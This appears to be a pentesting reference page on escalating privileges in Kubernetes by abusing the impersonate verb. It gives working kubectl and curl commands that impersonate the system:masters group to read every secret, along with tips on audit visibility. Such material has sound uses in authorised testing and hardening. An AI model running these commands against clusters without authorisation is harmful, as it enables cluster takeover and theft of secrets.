---
title: "Impersonation: acting as another user, group, or service account"
description: "The impersonate verb lets an identity send requests as a different user, group, or service account via the Impersonate-User and Impersonate-Group headers. An attacker with it impersonates a cluster admin or adds themselves to the system:masters group, gaining that identity's full permissions without changing any binding."
keywords:
  - impersonate
  - impersonate-user
  - system:masters
  - rbac
  - privilege escalation
---

# Impersonation

Kubernetes supports acting on behalf of another identity: a request carrying `Impersonate-User`, `Impersonate-Group`, or `Impersonate-Uid` headers is evaluated as that identity, provided the caller holds the `impersonate` verb on the matching resource. This is meant for controllers and admin tooling, but in an attacker's hands it is a clean escalation: impersonate a known cluster admin, or impersonate membership of the `system:masters` group, which is hard-wired to full access.

Check the permission:

```bash
kubectl auth can-i impersonate users
kubectl auth can-i impersonate groups
```

## Routes

```bash
# impersonate the system:masters group (bound to cluster-admin by default)
kubectl get secrets --all-namespaces --as=anything --as-group=system:masters
# impersonate a specific admin user
kubectl --as=admin@cluster get clusterrolebindings
# raw API: set the impersonation headers
curl -sk -H "Authorization: Bearer $T" \
  -H 'Impersonate-User: nobody' -H 'Impersonate-Group: system:masters' \
  $APISERVER/api/v1/secrets
```

Impersonating the `system:masters` group is the strongest form: that group bypasses RBAC entirely through the built-in `cluster-admin` binding, so any request made while impersonating it succeeds.

## Exploitation notes

- `impersonate` on `groups` is more powerful than on `users`, because impersonating `system:masters` grants full access regardless of which user you pair it with.
- Impersonation leaves the caller's own identity in the audit log alongside the impersonated one, so it is noisier than binding; it needs no object changes, though, which can be an advantage.
- The verb is scoped: `impersonate` may be limited to specific usernames or groups via `resourceNames`; check which values are allowed if a broad impersonation is denied.

## References

- [Kubernetes: user impersonation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)
- [Kubernetes: system:masters group](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#user-facing-roles)
- [HackTricks: Kubernetes impersonation](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
